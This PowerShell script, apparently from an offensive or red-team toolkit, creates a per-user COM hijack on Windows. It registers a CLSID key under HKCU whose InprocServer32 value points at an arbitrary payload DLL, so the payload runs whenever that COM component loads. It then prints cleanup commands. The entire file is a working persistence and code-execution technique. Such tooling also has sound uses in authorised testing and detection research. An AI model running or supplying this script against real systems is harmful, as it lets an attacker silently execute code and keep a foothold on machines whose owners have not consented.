#!/usr/bin/env pwsh
# Create standard COM hijack entry
# Usage: . scripts/create-com-hijack.ps1 -CLSID "{CLSID}" -PayloadPath "C:\path\to\payload.dll"

param(
    [Parameter(Mandatory=$true)]
    [string]$CLSID,
    
    [Parameter(Mandatory=$true)]
    [string]$PayloadPath,
    
    [Parameter(Mandatory=$false)]
    [string]$ThreadingModel = "Both"
)

Write-Host "[*] Creating COM hijack..." -ForegroundColor Cyan
Write-Host "    CLSID: $CLSID" -ForegroundColor Gray
Write-Host "    Payload: $PayloadPath" -ForegroundColor Gray
Write-Host "    ThreadingModel: $ThreadingModel" -ForegroundColor Gray

# Validate payload file exists
if (-not (Test-Path $PayloadPath)) {
    Write-Host "[!] Payload file not found: $PayloadPath" -ForegroundColor Red
    exit 1
}

# Validate CLSID format
if (-not ($CLSID -match '^\{[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\}$')) {
    Write-Host "[!] Invalid CLSID format" -ForegroundColor Red
    exit 1
}

$registryPath = "HKCU:Software\Classes\CLSID\$CLSID"
$inprocPath = "$registryPath\InprocServer32"

try {
    # Create CLSID key
    New-Item -Path $registryPath -Force | Out-Null
    Write-Host "[+] Created CLSID key: $registryPath" -ForegroundColor Green
    
    # Create InprocServer32 with payload path
    New-Item -Path $inprocPath -Force | Out-Null
    Set-ItemProperty -Path $inprocPath -Name '(default)' -Value $PayloadPath -Force
    Write-Host "[+] Set InprocServer32 to: $PayloadPath" -ForegroundColor Green
    
    # Set threading model
    Set-ItemProperty -Path $inprocPath -Name 'ThreadingModel' -Value $ThreadingModel -Force
    Write-Host "[+] Set ThreadingModel to: $ThreadingModel" -ForegroundColor Green
    
    Write-Host "`n[+] COM hijack created successfully!" -ForegroundColor Green
    Write-Host "[!] The payload will execute when the COM component is loaded" -ForegroundColor Yellow
    Write-Host "`n[TIP] To clean up, run:" -ForegroundColor Cyan
    Write-Host "    Remove-Item -Recurse -Force '$registryPath' 2>`$null" -ForegroundColor Gray
    Write-Host "    Remove-Item -Force '$PayloadPath' 2>`$null" -ForegroundColor Gray
    
} catch {
    Write-Host "[!] Error creating COM hijack: $_" -ForegroundColor Red
    exit 1
}
